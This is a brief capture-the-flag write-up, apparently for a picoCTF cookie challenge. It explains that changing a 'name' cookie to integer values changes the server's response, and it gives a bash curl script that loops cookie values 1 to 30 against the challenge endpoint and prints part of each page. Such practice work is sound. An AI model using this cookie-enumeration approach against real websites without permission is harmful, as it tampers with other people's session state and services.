> [!hint]- Hint(s)
> 1. 

### Step(s)
---
1. Here we can see that we have the cookie named "name" and when you change the value to an int like 1 you will get a response with "I love chocolate chip cookies!". 
2. Knowing this we can either manually change the cookie and check every response or use either (Burp Suite / ZAP) or a curl script
3. I chose to go with the curl script and made the following script that will give back whatever is in the "jumbotron" div
```bash
#!/bin/bash

url="http://mercury.picoctf.net:17781/check"
cookie_name="name"

for ((i = 1; i <= 30; i++)); do
    # Use curl to send a request with an incremented cookie value
    response=$(curl -b "$cookie_name=$i" -c cookies.txt "$url" 2>/dev/null)

    # Extract content within <div class="jumbotron">
    jumbotron_content=$(echo "$response" | sed -n '/<div class="jumbotron">/,/<\/div>/p')

    # If content is found, display it
    if [ -n "$jumbotron_content" ]; then
        echo "Request $i Jumbotron Content:"
        echo "$jumbotron_content"
        echo "----------------------"
    fi

    # You can add additional processing or checks here if needed

    # Sleep for a short duration before sending the next request
    sleep 1
done
```
